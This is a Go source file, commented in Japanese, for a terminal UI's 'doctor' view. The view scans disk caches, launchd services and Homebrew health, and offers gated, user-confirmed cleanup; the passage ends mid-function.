package main

import (
	"context"
	"fmt"
	"os"
	"sort"
	"strings"
	"time"

	tea "charm.land/bubbletea/v2"

	"doctor/disk"
	"doctor/runner"
	"doctor/svc"
)

// doctor (D キー) — 環境の健全性診断を並べる全画面ビュー (issue 148 の 3 章)。
//
// 器は「診断項目のセクション列」。doctor 自体はディスクやサービスを知らず、各セクションを
// 見出し (案 A: 左に縦棒、右端に要約、下に罫線) と行の列で並べるだけ。今回は 3 セクション:
// ディスク占有 (doctor/disk) / サービス (doctor/svc) / Homebrew (brew doctor の転記)。
//
// 行は「選べる行」(カーソルが止まる) と「補足行」からなる。Enter で選んだ行の詳細をその場に
// インライン展開する (ディスク = 中身 / 内訳、Homebrew = 警告の本文)。一覧は概要だけ、詳細は選んでから
// (ユーザー決定 2026-09-02)。④ の Space / d もこのカーソルに乗る。
//
// スキャンは**開いた時に始める** (起動時には走査しない。起動時は前回の結果を読んでトーストを出すだけ
// = doctor_cache.go)。終わったセクションから順に埋まる。
//
// 🚨 走査は ctx で束ね、閉じる / quit (cancelAll) で必ず cancel する。glogx は popup 運用で開閉が
// 頻繁なので、残留するとディスク I/O を飽和させる (3 章「終了時の後始末」)。
// 🚨 disk.Scan の OnResult は走査 goroutine から並行に呼ばれるので、channel に載せて Cmd で 1 件ずつ
// Msg にする (Update の外で状態を触らない)。
type doctorView struct {
	shown  bool
	gen    int // 開くたびに進める。閉じた後に届く古い Msg を捨てる
	cancel context.CancelFunc

	diskResults []disk.Result // 完了順
	diskTotal   int           // カタログのエントリ数 (進捗の分母)
	diskRep     *disk.Report  // 完了後 (nil = 走査中)
	diskCh      chan doctorDiskEvent
	svcRep      *svc.Report // nil = 走査中
	brew        *brewDoctorResult
	startedAt   time.Time
	snapshotAt  time.Time // 前回の結果をそのまま出しているときの走査時刻 (zero = 今回走査した)

	cursor   int             // rows の index (選べる行を指す)
	offset   int             // 窓の先頭 (rows の index)
	expanded map[string]bool // 展開中の行 (key = 行の同一性)
	rows     []doctorRow     // 直近の描画で組んだ行 (キー操作の対象。lines() が作り直す)

	pendingCopy  string // 直近の y / Y の中身 (copyPayload)
	pendingToast string // 直近の doctorToast の文言

	// ④ 削除 (doctor_delete.go)。selected はエントリ ID、inspected は「Enter で中身を一度開いた」印
	// (risk: confirm の行はこれが立つまで選べない)。
	selected         map[string]bool
	inspected        map[string]bool
	del              doctorDelete
	pendingDeleteCmd tea.Cmd // handleKey が組んだ削除の Cmd (browseModel が取り出して返す)

	// テスト用の差し替え口 (zero value = 本番)
	diskOpts   func() disk.Options
	svcOpts    func() svc.Options
	brewRun    runner.Runner
	deleteOpts func() disk.DeleteOptions
	deleteFn   func(context.Context, []disk.Result, disk.DeleteOptions) (disk.DeleteReport, error)
}

// deleteOptions は削除の実行口。走査と同じ Env / Runner を使う (判定の材料を 2 つ持たない)。
func (v *doctorView) deleteOptions() disk.DeleteOptions {
	if v.deleteOpts != nil {
		return v.deleteOpts()
	}
	return disk.DeleteOptions{Env: disk.RealEnv(), Run: runner.Exec}
}

// doctorRow は 1 行。selectable な行だけにカーソルが止まる。detail は Enter で展開する本文。
type doctorRow struct {
	text       string
	selectable bool
	key        string
	detail     []string
	// copyPath は y でコピーするパス (複数なら改行区切り)。copyText は Y でコピーする解説文
	// (ラベル・パス・復元方法・リスク・削除経路・提示コマンド。別セッションの LLM にそのまま投げられる形)。
	copyPath string
	copyText string
}

// doctorDiskEvent は disk.Scan からの 1 イベント (r = 1 エントリ完了 / rep = 全完了)。
type doctorDiskEvent struct {
	r   *disk.Result
	rep *disk.Report
}

type doctorDiskMsg struct {
	gen int
	ev  doctorDiskEvent
}

type doctorSvcMsg struct {
	gen int
	rep svc.Report
}

type doctorBrewMsg struct {
	gen int
	res brewDoctorResult
}

func (v *doctorView) visible() bool { return v.shown }

// scanning はいずれかのセクションが走査中か (スピナーの根拠)。
func (v *doctorView) scanning() bool {
	return v.shown && (v.diskRep == nil || v.svcRep == nil || v.brew == nil)
}

// toggle は開閉。開くときにスキャンを始める Cmd を返す。
func (v *doctorView) toggle() tea.Cmd {
	if v.shown {
		v.close()
		return nil
	}
	return v.open()
}

// open は開いて走査を始める。⚠️ 直近 doctorSnapshotTTL 以内の完全な結果があれば走査せずそれを出す
// (popup の開閉のたびにスキャンが走って見えるのを避ける)。r (rescan) は snapshot を無視する。
func (v *doctorView) open() tea.Cmd { return v.start(false) }

// catalogHas は「この ID が実効カタログにあるか」を返す (テストは diskOpts で catalog を差し替える)。
func (v *doctorView) catalogHas() func(string) bool {
	if v.diskOpts != nil {
		if cat := v.diskOpts().Catalog; len(cat) > 0 {
			ids := map[string]bool{}
			for _, e := range cat {
				ids[e.ID] = true
			}
			return func(id string) bool { return ids[id] }
		}
	}
	return disk.CatalogHasID
}

// rescan は snapshot を無視して走査し直す (r)。
func (v *doctorView) rescan() tea.Cmd { return v.start(true) }

func (v *doctorView) start(force bool) tea.Cmd {
	// ⚠️ **前世代を止めてから世代を進める** (issue 211 の敵対的レビュー P1)。rescan (r) は
	// start(true) を直接呼ぶので、ここで止めないと前世代の disk goroutine を誰も cancel できず、
	// latch に載ったまま完走する = waitDoctorCleanup の上限が「cancel + WaitDelay 2 秒」ではなく
	// PerEntry 60 秒 × 並列度 (約 6 分) になる。latch を入れる前は即終了だったので、
	// これが無いと 211 が hang を新設することになる
	v.stop()
	v.shown = true
	v.gen++
	v.cursor, v.offset = 0, 0
	v.expanded = map[string]bool{}
	v.selected, v.inspected = map[string]bool{}, map[string]bool{}
	v.del.reset()
	v.diskResults, v.diskRep, v.svcRep, v.brew = nil, nil, nil, nil
	v.startedAt = timeNow()
	v.snapshotAt = time.Time{}
	if !force {
		if sn, ok := loadDoctorSnapshot(timeNow()); ok {
			rep := sn.Disk
			// 実効カタログに無い ID は落とす (snapshot は書き換えられる。issue 178)
			rep.Results = doctorSnapshotInCatalog(rep.Results, v.catalogHas())
			rep.Total = disk.SumDeletable(rep.Results)
			v.diskRep = &rep
			v.diskResults = rep.Results
			svcRep := sn.Svc
			v.svcRep = &svcRep
			brew := sn.Brew
			v.brew = &brew
			v.snapshotAt = sn.ScannedAt
			return nil
		}
	}
	ctx, cancel := context.WithCancel(context.Background())
	v.cancel = cancel
	gen := v.gen

	dOpt := disk.Options{Env: disk.RealEnv(), Run: runner.Exec}
	if v.diskOpts != nil {
		dOpt = v.diskOpts()
	}
	if !force {
		// TTL を過ぎて走査し直すときも、重かったエントリは前回の値を使う (ディスク I/O を節約)
		sn, ok := loadDoctorSnapshotAny()
		dOpt.Reuse = doctorReuseFrom(sn, ok, timeNow())
	}
	catalogN := len(dOpt.Catalog)
	if catalogN == 0 {
		catalogN = disk.CatalogSize()
	}
	v.diskTotal = catalogN
	// 容量 = OnResult の回数 (カタログ数) + 完了 1 件。閉じた後に誰も読まなくても走査 goroutine は詰まらない
	ch := make(chan doctorDiskEvent, catalogN+1)
	v.diskCh = ch
	dOpt.OnResult = func(r disk.Result) { ch <- doctorDiskEvent{r: &r} }
	// latch へ登録する (issue 211): 再起動・終了の直前に子プロセスの帰還を看取るため。
	// doctorTrack は Add を呼び出し元の goroutine で済ませるので、Wait が登録を追い越さない
	doctorCleanup.add()
	go func() {
		defer doctorCleanup.done()
		rep := disk.Scan(ctx, dOpt)
		ch <- doctorDiskEvent{rep: &rep}
	}()

	sOpt := svc.Options{Run: runner.Exec}
	if v.svcOpts != nil {
		sOpt = v.svcOpts()
	} else if home, err := os.UserHomeDir(); err == nil {
		sOpt.Dirs = svc.DefaultDirs(home, os.Getuid())
	}
	bRun := v.brewRun
	if bRun == nil {
		bRun = runner.Exec
	}
	// ⚠️ svc / brew は tea.Cmd の goroutine で走る。bubbletea は Run を抜けるときに
	// Cmd の goroutine を待たないので、latch で看取る側を作っておく (issue 211)
	return tea.Batch(
		v.waitDiskCmd(gen),
		func() tea.Msg {
			var rep svc.Report
			doctorTrack(func() { rep = svc.Scan(ctx, sOpt) })
			return doctorSvcMsg{gen: gen, rep: rep}
		},
		func() tea.Msg {
			var res brewDoctorResult
			doctorTrack(func() { res = runBrewDoctor(ctx, bRun) })
			return doctorBrewMsg{gen: gen, res: res}
		},
	)
}

// waitDiskCmd は channel から 1 イベント取り出して Msg にする (受け取り側が再アームする)。
func (v *doctorView) waitDiskCmd(gen int) tea.Cmd {
	ch := v.diskCh
	return func() tea.Msg {
		ev, ok := <-ch
		if !ok {
			return nil
		}
		return doctorDiskMsg{gen: gen, ev: ev}
	}
}

// close は走査を止めて閉じる。ディスクが未完了なら完了済みの分を partial としてキャッシュに書く
// (savePartialOnClose が守る条件のもとで)。
func (v *doctorView) close() {
	v.del.reset() // 相を残さない (今は handleDeleteKey が閉じるキーを飲むので不到達だが、並び順に依存させない)
	v.stop()
	v.shown = false
	if v.diskRep == nil && len(v.diskResults) > 0 {
		rep := disk.Report{Results: append([]disk.Result(nil), v.diskResults...), ScannedAt: timeNow(), Partial: true}
		sort.SliceStable(rep.Results, func(a, b int) bool { return rep.Results[a].Size > rep.Results[b].Size })
		rep.Total = disk.SumDeletable(rep.Results)
		v.saveCache(rep)
	}
}

// stop は走査だけを止める (cancelAll から呼ぶ後始末。画面の状態は触らない。partial も保存しない)。
func (v *doctorView) stop() {
	// 削除の途中で外から終了させられたら、**ctx で中断を伝える** (プロセスを殺すだけだと
	// 記録が executing のまま残り、cli: の子プロセスが孤児になる)。
	// ⚠️ cancel だけでは**子プロセスの死を待たない** (issue 211)。cancelAll → waitDoctorCleanup の
	//    順で看取ること。削除も doctorCleanup latch に載っている (doctor_delete.go)
	if v.del.cancel != nil {
		v.del.cancel()
	}
	if v.cancel != nil {
		v.cancel()
		v.cancel = nil
	}
}

// saveCache は結果をキャッシュへ。**不完全さの種類ごとに扱いを分ける** (issue 172 / 173)。
// 時間で区切る形は採らない: 「前回の完全結果の古さ」は「今回の結果が途中経過か」と無関係で、
// doctor をたまにしか開かない普通の運用が丸ごと無保護になる (敵対レビュー 2026-09-03 で実測:
// 3 時間前の 45GB が、開いて即 Esc の 1MB で潰れた)。
//
//	partial (中断)     : 🚨 完全な結果を潰さない。Esc や r の直後の数件だけの結果で 45GB を 200MB に
//	                     置き換えると、起動トーストが閾値未満で無期限に沈黙する (敵対レビュー
//	                     2026-09-02 P2)。**これは doctorCacheFromReport が前回の記録に重ねて書く
//	                     ことで構造的に防ぐ**。以前は「合計が前回より小さければ書かない」という
//	                     ガードで守っていたが、重ねるようになった今それは冗長で、しかも
//	                     「今回実際に測り直して縮んだと分かったエントリ」まで古い値へ差し戻す
//	                     副作用があった (敵対レビュー 2026-09-03)。外したときにマスクしていたものは
//	                     issue 173 に列挙してある
//	Reused を含む完了  : 書く。ただし再利用したエントリの数字は**前回の実測値を引き継ぐ**
//	                     (doctorCacheFromReport)。「Reused があれば書かない」にすると、重いエントリが
//	                     複数あるときに恒久的に凍結する (issue 172)
//	failed を含む完了  : 書く。走査は完走していて、その環境の現実がそれ。書かないと「1 エントリが
//	                     恒久的に測れない Mac」でキャッシュが永久に凍結する。沈黙は Failed 件数を
//	                     キャッシュに持たせ、トースト側で「N 件は診断できず」を出して防ぐ (issue 173)
func (v *doctorView) saveCache(rep disk.Report) {
	prev, _ := loadDoctorDiskCache()
	_ = saveDoctorDiskCache(doctorCacheFromReport(rep, prev)) // 保存失敗は表示に影響しない
}

// receiveDisk は disk のイベントを受ける。完了なら nil、途中なら次を待つ Cmd を返す。
func (v *doctorView) receiveDisk(msg doctorDiskMsg) tea.Cmd {
	if msg.gen != v.gen || !v.shown {
		return nil
	}
	if msg.ev.rep != nil {
		v.diskRep = msg.ev.rep
		v.saveCache(*msg.ev.rep) // Partial な完了 (中断) も saveCache の規律の中で扱う
		v.maybeSaveSnapshot()
		return nil
	}
	if msg.ev.r != nil {
		v.diskResults = append(v.diskResults, *msg.ev.r)
	}
	return v.waitDiskCmd(msg.gen)
}

func (v *doctorView) receiveSvc(msg doctorSvcMsg) {
	if msg.gen != v.gen || !v.shown {
		return
	}
	rep := msg.rep
	v.svcRep = &rep
	v.maybeSaveSnapshot()
}

func (v *doctorView) receiveBrew(msg doctorBrewMsg) {
	if msg.gen != v.gen || !v.shown {
		return
	}
	res := msg.res
	v.brew = &res
	v.maybeSaveSnapshot()
}

// maybeSaveSnapshot は 3 セクションが揃った時点で完全な結果を書く (TTL 内の開き直しで再利用)。
func (v *doctorView) maybeSaveSnapshot() {
	if v.diskRep == nil || v.svcRep == nil || v.brew == nil || v.diskRep.Partial {
		return
	}
	_ = saveDoctorSnapshot(doctorSnapshot{ScannedAt: timeNow(), Disk: *v.diskRep, Svc: *v.svcRep, Brew: *v.brew})
}

// doctorAction は handleKey の結果 (rlDash と同じ語彙)。
type doctorAction int

const (
	doctorSwallow doctorAction = iota // 全画面なので裏の一覧へ素通りさせない
	doctorClosed
	doctorRescan    // r: 走査し直す (browseModel が open() で起こす。close は経由しない = partial を書かない)
	doctorCopyPath  // y: 選んだ行のパスをコピー (中身は copyPayload)
	doctorCopyText  // Y: 選んだ行の解説文をコピー (同上)
	doctorNothing   // y/Y を押したがコピーするものが無い (browseModel がその旨をトーストにする)
	doctorToast     // 削除の導線が理由を出したい (pendingToast)
	doctorRunDelete // 削除を開始する (pendingDeleteCmd を browseModel が実行する)
)

// copyPayload は直近の y / Y でコピーする文字列 (handleKey がセットし、browseModel が取り出す)。
func (v *doctorView) copyPayload() string { return v.pendingCopy }

func (v *doctorView) handleKey(key string, page int) doctorAction {
	// 削除の語彙が立っているあいだは、そちらが先にキーを取る
	// (確認中の y が「コピー」に化けない / 実行中に別の行へ移動できない)
	if act, taken := v.handleDeleteKey(key); taken {
		return act
	}
	switch key {
	case " ":
		if why, ok := v.toggleSelect(); !ok {
			if why == "" {
				return doctorSwallow
			}
			v.pendingToast = why
			return doctorToast
		}
		return doctorSwallow
	case "d":
		return v.beginDelete()
	case "D", "q", "esc":
		v.close()
		return doctorClosed
	case "r":
		v.stop()
		return doctorRescan
	case "j", "down":
		v.moveCursor(+1)
	case "k", "up":
		v.moveCursor(-1)
	case "ctrl+d", "pgdown":
		for range max(1, page/2) {
			v.moveCursor(+1)
		}
	case "ctrl+u", "pgup":
		for range max(1, page/2) {
			v.moveCursor(-1)
		}
	case "g":
		v.cursor, v.offset = 0, 0
		v.moveCursor(0)
	case "G":
		v.cursor = len(v.rows) - 1
		v.moveCursor(0)
	case "enter":
		if v.cursor >= 0 && v.cursor < len(v.rows) && v.rows[v.cursor].selectable && len(v.rows[v.cursor].detail) > 0 {
			k := v.rows[v.cursor].key
			v.expanded[k] = !v.expanded[k]
			if id, ok := strings.CutPrefix(k, "disk:"); ok && v.expanded[k] {
				if v.inspected == nil {
					v.inspected = map[string]bool{}
				}
				v.inspected[id] = true // risk: confirm の行はこれが立つまで選べない
			}
		}
	case "y", "Y":
		if v.cursor < 0 || v.cursor >= len(v.rows) || !v.rows[v.cursor].selectable {
			return doctorNothing
		}
		row := v.rows[v.cursor]
		v.pendingCopy = row.copyText
		action := doctorCopyText
		if key == "y" {
			v.pendingCopy, action = row.copyPath, doctorCopyPath
		}
		if v.pendingCopy == "" {
			return doctorNothing
		}
		return action
	}
	return doctorSwallow
}

// moveCursor は選べる行の間を dir 方向に 1 つ動く (0 = 今の位置を選べる行へ寄せる)。
func (v *doctorView) moveCursor(dir int) {
	if len(v.rows) == 0 {
		v.cursor = 0
		return
	}
	i := v.cursor
	if dir == 0 {
		for j := i; j < len(v.rows); j++ {
			if v.rows[j].selectable {
				v.cursor = j
				return
			}
		}
		for j := i; j >= 0; j-- {
			if v.rows[j].selectable {
				v.cursor = j
				return
			}
		}
		return
	}
	for j := i + dir; j >= 0 && j < len(v.rows); j += dir {
		if v.rows[j].selectable {
			v.cursor = j
			return
		}
	}
}

// hint は最下行の案内。**幅に入らない項目は落とす** (切ると語の途中で切れて意味が壊れ、
// しかも消えるのは常に末尾 = 抜ける手段が消える。status viewer と同じ fitHintItems の作法)。
// 実測 2026-09-03: 固定文字列だと 112 桁あり、popup の予算 82 桁で「D/q/esc: 閉じる」と
// 「(削除はまだできません)」が画面から消えていた (issue 201)。
func (v *doctorView) hint(width int) string {
	if v.del.blocking() {
		return " 実行中です (Ctrl-C ×2 で中断)"
	}
	if v.del.confirm {
		if !planHasWork(v.del.plan) {
			return " 消せるものがありません (何かキーを押すと戻ります)"
		}
		return " y: 削除する   n/Esc: やめる"
	}
	if v.del.result != nil || v.del.err != "" {
		return " 何かキーを押すと閉じ、もう一度スキャンします"
	}
	items := []hintItem{
		{"j/k: 移動", 3},
		{"Space: 選択", 2}, // 削除の入口なので Enter より優先して残す
		{"d: 削除", 2},
		{"Enter: 詳細", 4},
		{"y: パスをコピー", 5},
		{"Y: 解説をコピー", 6},
		{"r: 再スキャン", 5},
		{"D/q/esc: 閉じる", 1}, // 抜ける手段は最優先で残す
	}
	if n, total := v.selectionSummary(); n > 0 {
		items = append([]hintItem{{fmt.Sprintf("選択 %d 件 %s", n, disk.HumanSize(total)), 1}}, items...)
	}
	return fitHintItems(width, items)
}

// doctorRenderOpts は描画情報。
type doctorRenderOpts struct {
	width   int
	page    int
	colored bool
	spinner string
	now     time.Time
}

// lines はちょうど page 行を返す (全画面 viewer 共通の契約)。行を組み直し、カーソルが窓に入るよう offset を寄せる。
func (v *doctorView) lines(o doctorRenderOpts) []string {
	// 削除の確認 / 進捗 / 結果は全画面で差し替える (重ねると狭い幅で下の行が透けて読めなくなる)
	if panel := v.deletePanel(o); panel != nil {
		return padTo(panel, o.page)
	}
	v.rows = v.buildRows(o)
	if v.cursor >= len(v.rows) {
		v.cursor = max(0, len(v.rows)-1)
	}
	v.moveCursor(0)
	head := []string{v.headerLine(o), ""}
	room := max(o.page-len(head), 1)
	if v.cursor < v.offset {
		v.offset = v.cursor
	}
	if v.cursor >= v.offset+room {
		v.offset = v.cursor - room + 1
	}
	if v.offset > max(0, len(v.rows)-room) {
		v.offset = max(0, len(v.rows)-room)
	}
	out := make([]string, 0, o.page)
	out = append(out, head...)
	for i := v.offset; i < len(v.rows) && len(out) < o.page; i++ {
		mark := "  "
		if i == v.cursor && v.rows[i].selectable {
			mark = "▶ "
		}
		out = append(out, truncateDisp(mark+v.rows[i].text, o.width, "…"))
	}
	return padTo(out, o.page)
}

func (v *doctorView) headerLine(o doctorRenderOpts) string {
	left := " doctor"
	switch {
	case v.scanning():
		left += "  " + o.spinner + " スキャン中 " + timeNow().Sub(v.startedAt).Round(time.Second).String()
	case !v.snapshotAt.IsZero():
		left += fmt.Sprintf("  %d 分前の結果 (r で再スキャン)", int(o.now.Sub(v.snapshotAt).Minutes()))
	}
	right := "[Enter] 詳細  [r] 再スキャン  [D/Esc] 閉じる "
	gap := o.width - dispWidth(left) - dispWidth(right)
	if gap < 1 {
		return left
	}
	return left + padSpaces(gap) + right
}

// sectionHeader は案 A の見出し 2 行 (左に縦棒 + 太字の題、右端に要約 / 下に罫線)。
func sectionHeader(o doctorRenderOpts, title, summary string) []doctorRow {
	left := "▌" + title
	inner := o.width - 2 // 行頭のカーソル欄 2 桁
	gap := inner - dispWidth(left) - dispWidth(summary) - 1
	line := doctorColor(o.colored, ansiBold, left)
	if gap >= 1 {
		line += padSpaces(gap) + summary
	}
	rule := strings.Repeat("─", max(1, inner))
	return []doctorRow{{text: line}, {text: doctorColor(o.colored, ansiDim, rule)}}
}

// buildRows はセクション列 (ディスク / サービス / Homebrew)。展開中の行はその直後に detail を足す。
func (v *doctorView) buildRows(o doctorRenderOpts) []doctorRow {
	var rows []doctorRow
	add := func(section []doctorRow) {
		for _, r := range section {
			rows = append(rows, r)
			if r.selectable && v.expanded[r.key] {
				for _, d := range r.detail {
					rows = append(rows, doctorRow{text: d})
				}
			}
		}
		rows = append(rows, doctorRow{})
	}
	add(v.diskSection(o))
	add(v.svcSection(o))
	add(v.brewSection(o))
	return rows
}

func doctorColor(colored bool, code, s string) string {
	if !colored {
		return s
	}
	return code + s + ansiReset
}

func (v *doctorView) diskSection(o doctorRenderOpts) []doctorRow {
	results := v.diskResults
	partial := false
	if v.diskRep != nil {
		results = v.diskRep.Results
		partial = v.diskRep.Partial
	}
	total := disk.SumDeletable(results)
	summary := fmt.Sprintf("合計 %s 解放可能", disk.HumanSize(total))
	switch {
	case v.diskRep == nil:
		summary = fmt.Sprintf("%s スキャン中 %d/%d   %s", o.spinner, len(results), v.diskTotal, summary)
	case partial:
		summary = "(中断: 部分結果) " + summary
	}
	rows := sectionHeader(o, "ディスク占有", summary)
	sorted := append([]disk.Result(nil), results...)
	sort.SliceStable(sorted, func(a, b int) bool { return sorted[a].Size > sorted[b].Size })
	shown := 0
	for _, r := range sorted {
		if r.Status == disk.StatusOK && len(r.Items) == 0 && len(r.Failures) == 0 {
			continue
		}
		shown++
		size := disk.HumanSize(r.Size)
		if r.Status == disk.StatusFailed {
			size = "---"
		}
		mark, color := doctorRiskMark(r)
		// ラベル列は狭い幅で縮める。**マークより先にラベルを削る**のは、切れて困る順が
		// 「状態 > ラベルの詳細」だから (幅 60 で `⛔ 要…` になると、その行が何なのかは
		// 分かってもどう扱えばよいかが消える。実測 2026-09-03。issue 182)
		labelW := doctorLabelWidth
		if room := o.width - doctorDiskRowFixedW - doctorMaxMarkWidth(); room < labelW {
			labelW = max(room, doctorMinLabelWidth)
		}
		label := truncateDisp(r.Entry.Label, labelW, "…")
		sel := " "
		if v.selected[r.Entry.ID] {
			sel = doctorColor(o.colored, ansiBold, "*") // 選択は半角 1 桁で固定 (全角を混ぜると列がずれる)
		}
		row := doctorRow{
			text:       fmt.Sprintf("%s%8s  %s%s %s", sel, size, label, padSpaces(labelW-dispWidth(label)), doctorColor(o.colored, color, mark)),
			selectable: true,
			key:        "disk:" + r.Entry.ID,
			detail:     v.diskDetail(o, r),
			copyPath:   diskCopyPath(r),
			copyText:   diskCopyText(r, mark),
		}
		rows = append(rows, row)
		if r.Status == disk.StatusFailed || r.Status == disk.StatusBlocked {
			// 理由は 1 行下に出す (マーク列に置くと狭い幅で切れる。issue 182)
			rows = append(rows, doctorRow{text: doctorColor(o.colored, ansiDim, "           "+r.Reason)})
			continue
		}
		advice := r.Entry.Recover
		if newest := doctorNewest(r); !newest.IsZero() {
			advice += fmt.Sprintf("。最終更新 %s (%d日前)", newest.Format("2006-01-02"), int(o.now.Sub(newest).Hours()/24))
		}
		if r.Reused {
			// ⚠️ 再利用の注記は**行頭**に置く。末尾に足すと狭い幅で真っ先に切れ、
			// 「その数字は今測ったものではない」が分からなくなる (issue 172 が
			// 「注記で分かる形にしてある」と書いた前提が幅で崩れる。issue 182)
			advice = fmt.Sprintf("%d 分前の計測を再利用 (r で再計測)。%s", int(o.now.Sub(r.MeasuredAt).Minutes()), advice)
		}
		rows = append(rows, doctorRow{text: doctorColor(o.colored, ansiDim, "           "+advice)})
		for _, f := range r.Failures {
			// 「診断できず」は最も追加調査が必要な行なので、選んで中身を取り出せるようにする
			// (幅で末尾が切れても y / Y で完全な文字列が手に入る。幅そのものの改善は issues/182)。
			// ⚠️ y が渡すのは理由の文字列 (パスを含む) で、パス単体ではない: disk.Result.Failures が
			// []string で、パスがエラー文に埋め込まれているため (構造化は issues/180 で保留と判断)
			rows = append(rows, doctorRow{
				text:       doctorColor(o.colored, ansiYellow, "           ❓ 一部走査できず (合計に含めていません): "+f),
				selectable: true,
				key:        "diskfail:" + r.Entry.ID + ":" + f,
				detail: []string{
					doctorColor(o.colored, ansiDim, "        "+r.Entry.Label+" の一部を走査できませんでした (この分は合計に入っていません)"),
					doctorColor(o.colored, ansiDim, "        "+f),
				},
				copyPath: f,
				copyText: diskCopyText(r, mark),
			})
		}
	}
	if v.diskRep != nil && shown == 0 {
		rows = append(rows, doctorRow{text: doctorColor(o.colored, ansiDim, "   掃除候補はありません")})
	}
	return rows
}

// diskDetail は Enter で開く内訳: Inspect なら中身の一覧 (ユーザーファイルかを人が見る)、それ以外は item ごとのサイズとパス。
func (v *doctorView) diskDetail(o doctorRenderOpts, r disk.Result) []string {
	out := make([]string, 0, 2+len(r.Contents)+len(r.Items))
	// 走査できなかった行に削除経路を出さない。消せる候補が確定していないのに
	// 「削除経路: rm」だけ出ると、消してよいものが見つかったように読める
	// (CLI の Format は failed のとき理由だけを出す。UI もそれに揃える。issue 182)
	if r.Status != disk.StatusFailed {
		out = append(out, doctorColor(o.colored, ansiDim, "             削除経路: "+r.Entry.DeleteVia+" (Space で選び d で削除)"))
	}
	if r.Entry.Detail != "" {
		out = append(out, doctorColor(o.colored, ansiDim, "             "+r.Entry.Detail))
	}
	if r.Entry.Inspect || len(r.Contents) > 0 {
		for _, c := range r.Contents {
			out = append(out, "               - "+c)
		}
		// ⚠️ Inspect は「中身を見てから選ばせる」ためのゲートなので、**開いても何も出ない**形を
		// 作らない (中身が無いのか、走査が拾えなかったのかが区別できないまま選べてしまう。
		// 敵対レビュー 2026-09-03)。中身が無ければ対象のパスそのものを出す
		if len(r.Contents) == 0 {
			out = append(out, doctorColor(o.colored, ansiDim, "             (中身の一覧はありません。対象は次のパスです)"))
			for _, it := range r.Items {
				out = append(out, fmt.Sprintf("             %9s  %s", disk.HumanSize(it.Size), it.Path))
			}
		}
		return out
	}
	for _, it := range r.Items {
		out = append(out, fmt.Sprintf("             %9s  %s", disk.HumanSize(it.Size), it.Path))
	}
	return out
}

// 記号は表示幅が安定するものだけ使う。⚠️ (U+26A0 + VS16) は端末によって 1 桁と 2 桁で揺れ、行の右端が
// フレームごとに動いて見えた (ユーザー報告 2026-09-02)。🚨 (U+1F6A8) は常に 2 桁。
func doctorRiskMark(r disk.Result) (string, string) {
	switch r.Status {
	case disk.StatusBlocked:
		// ⚠️ マーク列は**固定語彙**にする。可変長の理由をここに置くと狭い幅で切れて
		// 「🚨 Google Chrome Canary …」のように**何が起きたのか分からない断片**が残る
		// (実測 2026-09-03 幅 80。issue 182)。理由は呼び出し側が下の dim 行へ出す。
		// 記号も caution (🚨) と分ける: NO_COLOR では色が消えるので、記号が同じだと
		// 「触れない」と「注意して消す」が区別できない
		return "🚫 対象外", ansiYellow
	case disk.StatusFailed:
		return "❓ 走査できず", ansiDim
	case disk.StatusOK:
	}
	switch r.Entry.Risk {
	case disk.RiskSafe:
		return "✅ 安全", ansiGreen
	case disk.RiskCaution:
		return "🚨 注意", ansiYellow
	case disk.RiskConfirm:
		return "⛔ 要確認", ansiRed
	}
	return string(r.Entry.Risk), ""
}

// doctorLabelWidth はディスク行のラベル列の表示幅 (リスク記号の列を揃えるため)。
// 端末が狭いときは doctorMinLabelWidth まで縮める (issue 182)。
const doctorLabelWidth = 40

const (
	// doctorDiskRowFixedW はディスク行のラベル以外の固定部分 (" %8s  " + マーク前の空白 1)。
	doctorDiskRowFixedW = 12
	// doctorMinLabelWidth はこれ以上は縮めない下限。ここを割るほど狭い端末では
	// ラベルもマークも切れるが、**マークを優先して残す** (状態が読めない行は使えない)
	doctorMinLabelWidth = 8
)

// doctorMaxMarkWidth はリスク記号の最大表示幅。マークは固定語彙なので測れる
// (可変長の理由をマーク列へ入れないのは issue 182 の対応)。
func doctorMaxMarkWidth() int {
	w := 0
	for _, m := range []string{"✅ 安全", "🚨 注意", "⛔ 要確認", "🚫 対象外", "❓ 走査できず"} {
		w = max(w, dispWidth(m))
	}
	return w
}

func doctorNewest(r disk.Result) time.Time {
	var t time.Time
	for _, it := range r.Items {
		if it.Mtime.After(t) {
			t = it.Mtime
		}
	}
	return t
}

func (v *doctorView) svcSection(o doctorRenderOpts) []doctorRow {
	if v.svcRep == nil {
		return sectionHeader(o, "サービス", o.spinner+" launchd の登録を確認中")
	}
	rep := v.svcRep
	rows := sectionHeader(o, "サービス", fmt.Sprintf("壊れた登録 %d 件 (%d 件を走査)", len(rep.Findings), rep.Scanned))
	undiagnosed := rep.Interrupted || rep.StatusErr != "" || rep.BrewErr != "" || len(rep.DirErrs) > 0 || len(rep.Undiagnosed) > 0
	if rep.Interrupted {
		rows = append(rows, doctorRow{text: doctorColor(o.colored, ansiYellow, " 🚨 途中で中断されました")})
	}
	if rep.StatusErr != "" {
		rows = append(rows, doctorRow{text: doctorColor(o.colored, ansiYellow, " 🚨 診断できず (launchctl): "+rep.StatusErr+" — 実行ファイルの不在と Homebrew 台帳だけを見ています")})
	}
	if rep.BrewErr != "" {
		rows = append(rows, doctorRow{text: doctorColor(o.colored, ansiYellow, " 🚨 診断できず (brew): "+rep.BrewErr)})
	}
	for _, e := range rep.DirErrs {
		rows = append(rows, doctorRow{text: doctorColor(o.colored, ansiYellow, " 🚨 走査できず: "+e)})
	}
	for _, f := range rep.Findings {
		detail := []string{doctorColor(o.colored, ansiDim, "      手動で実行してください (このツールは実行しません):")}
		for _, c := range f.Commands {
			detail = append(detail, "        "+c)
		}
		rows = append(rows, doctorRow{text: doctorColor(o.colored, ansiRed, " ⛔ "+f.Label), selectable: true, key: "svc:" + f.PlistPath, detail: detail,
			copyPath: f.PlistPath, copyText: svcCopyText(f)})
		for _, r := range f.Reasons {
			rows = append(rows, doctorRow{text: doctorColor(o.colored, ansiDim, "      - "+r)})
		}
		for _, a := range svc.Annotations(f) {
			rows = append(rows, doctorRow{text: doctorColor(o.colored, ansiDim, "      - "+a)})
		}
	}
	for _, u := range rep.Undiagnosed {
		// 選べないと理由も plist のパスもどこからも取り出せなかった (幅 80 で理由が丸ごと消える。issues/180)
		rows = append(rows, doctorRow{
			text:       doctorColor(o.colored, ansiYellow, " ❔ 診断できず: "+u.PlistPath+" ("+u.Reason+")"),
			selectable: true,
			key:        "svcundiagnosed:" + u.PlistPath,
			detail: []string{
				doctorColor(o.colored, ansiDim, "      理由: "+u.Reason),
				doctorColor(o.colored, ansiDim, "      手動で確かめてください (このツールは実行しません):"),
